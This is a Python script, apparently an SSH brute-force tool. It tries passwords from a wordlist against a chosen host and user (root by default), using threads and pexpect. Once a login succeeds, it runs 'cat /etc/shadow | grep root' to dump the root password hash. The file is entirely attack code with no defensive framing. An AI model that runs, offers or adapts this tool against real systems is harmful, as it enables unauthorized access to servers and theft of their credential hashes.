import sys
import os
import time
from socket import *
from threading import *
from sys import stdout
import pexpect

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
PROMPT = ['# ', '>>> ', '> ','\$ ']
Found = False
Fails = 0

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)
    
    
def connect(host, user, password, release):
    global Found
    global Fails

    try:
        ssh_newkey = 'Are you sure you want to continue connecting'
        connStr = 'ssh ' + user + '@' + host
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey,\
                        '[P|p]assword:'])
        if ret == 2:
            child.sendline(password)
            child.expect(PROMPT)
            stdout.write('\n\n[+] Password Found: %s' % password)
            stdout.write('\n\n')
            send_command(child, 'cat /etc/shadow | grep root')
#            send_command(child, 'cat /etc/shadow | grep %s' % user)
            Found = True
    except Exception as e:
        return
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
            if release: connection_lock.release()

def main():
    ver = sys.version.split(' ')[0]
    if ver[0] == "3":
        ansh = input('[.] Host? (IP or domain): ')
        ansu = input('[.] user? : ')
        ansf = input('[.] Password File: [ ]default : ')
        ansv = input('[.] Verbose - default Yes: ').upper()
    else:
        ansh = raw_input('[.] Host? (IP or domain): ')
        ansu = raw_input('[.] user?: ')
        ansf = raw_input('[.] Password File: [ ]default : ')
        ansv = raw_input('[.] Verbose - default Yes: ').upper()
    host='127.0.0.1' if ansh == "" else ansh
    stdout.write('\n[?] verifying connection...\n')
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)
        connSkt.connect((host, 22))
    except Exception as e:
        stdout.write('\n\n[-] port 22 closed on Host %s ' % host + ' Exiting...\n')
        stdout.flush()
        exit(0)
    user = 'root' if ansu == "" else ansu
    verbose_Flg = 'Y' if ansv == "" else "N"    
    try:
        if ansf == "":
            try:
                __dir__ = os.path.dirname(os.path.abspath(__file__))
                filepath = os.path.join(__dir__, 'pass.txt')
                passwdFile = filepath                
            except Exception as e:
                 stdout.write('\n[-] Err: %s' % e)
                 exit(__main__)
        else:
            try:
                f=ansf
                __dir__ = os.path.dirname(os.path.abspath(__file__))
                filepath = os.path.join(__dir__, ansf)
                passwdFile = filepath                
            except Exception as e:
                 stdout.write('\n[-] Err: %s' % e)
                 exit(__main__)
    except Exception as e:
        if verbose_Flg == "Y":
            stdout.write('\n[-] Err: %s' % e)
    Thread_Flg = "Y"
    cont = 1
    stdout.write('\n[+] Scan Results for: %s' % user +'@' +'%s' % host+ ' From File: %s ' % passwdFile + '\n')
    stdout.write('[+] please wait...til Done' + '\n')
    stdout.flush()
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            stdout.write('\n[*] Exiting Password Found')
            exit(0)
        if Fails > 5:
            stdout.write("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        if Found:
            pass
        else:
            sys.stdout.write('\n[-] Testing: %s' % str(password) +'   please wait....')
            sys.stdout.write('( %s )'% str(cont))
            stdout.flush()
        
        cont += 1
        if Thread_Flg == "Y":
            t = Thread(target=connect, args=(host, user, password, True))
            child = t.start()
        else:
            connect(host, user, password, True)
    if Thread_Flg == "N":
        if fn.read() == "":
            stdout.write('\n\n[*] Exiting Password NOT Found')   
    else:
         stdout.write('\n\n[*] Done\n')
if __name__ == '__main__':
    main()

